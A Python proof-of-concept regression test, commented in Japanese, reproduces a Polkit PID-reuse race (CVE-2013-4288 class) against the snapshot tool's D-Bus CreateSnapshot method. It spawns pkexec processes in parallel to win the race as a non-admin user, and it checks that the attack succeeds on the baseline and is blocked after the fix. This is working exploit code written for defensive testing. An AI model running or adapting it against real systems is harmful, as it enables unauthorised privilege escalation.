#!/usr/bin/env python3
"""
@file poc_polkit_race.py
@brief Issue #1 (CVE-2013-4288クラス) の権限昇格raceを再現するPoC

目的 :
    v1.3.2のcheckAuthorization()はPolkitQt1::UnixProcessSubjectを使い、PIDベースでPolkit判定を行う
    bob (非管理者) から呼び出した直後に同じPIDのプロセスをexecで置き換えるかPID再利用を誘発すると
    Polkit判定が別プロセスの情報に対して行われ、権限昇格が可能になる
    修正版 (P0-1後) ではSystemBusNameSubjectを用いるためD-Bus接続単位で判定され、このraceは成立しない

使い方 : sudo -u bob python3 poc_polkit_race.py --iterations 1000
終了コード : 0 = 期待どおり (baselineは再現、修正版は阻止)、1 = regression、2 = VM外またはpython3-dbus未導入

注意 :
    このPoCはVM内でのみ実行すること
    common.shのassert_running_in_vm相当をPythonでも確認している
"""

import argparse
import os
import subprocess
import sys
import time
from concurrent.futures import ThreadPoolExecutor

try:
    from dbus import SystemBus, Interface  # type: ignore
    from dbus.exceptions import DBusException  # type: ignore
except ImportError:
    print("ERROR: python3-dbus is required", file=sys.stderr)
    sys.exit(2)

DBUS_SERVICE = "com.presire.qsnapper.Operations"
DBUS_PATH = "/com/presire/qsnapper/Operations"
DBUS_IFACE = "com.presire.qsnapper.Operations"


def assert_vm() -> None:
    """
    @brief VM内で実行されていることを確認する

    Raises:
        SystemExit: VM外 (systemd-detect-virtがnone) の場合 (終了コード2)
    """
    virt = subprocess.run(
        ["systemd-detect-virt"], capture_output=True, text=True
    ).stdout.strip()
    if virt == "none":
        print("ERROR: must run in a VM", file=sys.stderr)
        sys.exit(2)


def attempt_call() -> str:
    """
    @brief CreateSnapshotを1回試行し、結果を分類する

    Returns:
        success (成功)、denied (拒否)、other:<msg> (その他のエラー) のいずれか
    """
    bus = SystemBus()
    proxy = bus.get_object(DBUS_SERVICE, DBUS_PATH)
    ops = Interface(proxy, DBUS_IFACE)
    try:
        ops.CreateSnapshot("root", "single", "poc-race", 0, "", {}, False)
        return "success"
    except DBusException as e:
        name = e.get_dbus_name()
        if "AccessDenied" in name or "NotAuthorized" in name:
            return "denied"
        return f"other:{name}"


def race_worker(_: int) -> str:
    """
    @brief PID再利用を誘発する短寿命プロセスと並行してCreateSnapshotを試行する

    Args:
        _ : 未使用のイテレーション番号 (ThreadPoolExecutor.map用)

    Returns:
        attempt_call()と同じ分類文字列
    """
    # 並列に短寿命のpkexecプロセスを走らせてPID再利用を誘発する
    # TODO: 実環境に合わせてpkexecの対象を調整する
    subprocess.Popen(
        ["pkexec", "--disable-internal-agent", "true"],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
    )
    time.sleep(0.0005)  # 競合窓を設ける
    return attempt_call()


def main() -> int:
    """
    @brief race PoCを実行し、モードに応じて再現または阻止を判定する

    Returns:
        0 = 期待どおり (baselineは再現、修正版は阻止)、1 = regression
    """
    parser = argparse.ArgumentParser()
    parser.add_argument("--iterations", type=int, default=1000)
    parser.add_argument("--workers", type=int, default=8)
    args = parser.parse_args()

    assert_vm()
    mode = "baseline" if os.environ.get("BASELINE") else "fixed"
    print(f"mode={mode} uid={os.geteuid()} iterations={args.iterations}")

    if os.geteuid() == 0:
        print("WARN: running as root; switch to 'bob' via sudo -u bob", file=sys.stderr)

    success = denied = other = 0
    with ThreadPoolExecutor(max_workers=args.workers) as ex:
        for outcome in ex.map(race_worker, range(args.iterations)):
            if outcome == "success":
                success += 1
            elif outcome == "denied":
                denied += 1
            else:
                other += 1

    print(f"success={success} denied={denied} other={other}")
    reproduced = success > 0
    expected_reproduced = mode == "baseline"
    if reproduced == expected_reproduced:
        print(f"RESULT: PASS (reproduced={reproduced})")
        return 0
    print(f"RESULT: FAIL (reproduced={reproduced}, expected={expected_reproduced})")
    return 1


if __name__ == "__main__":
    sys.exit(main())
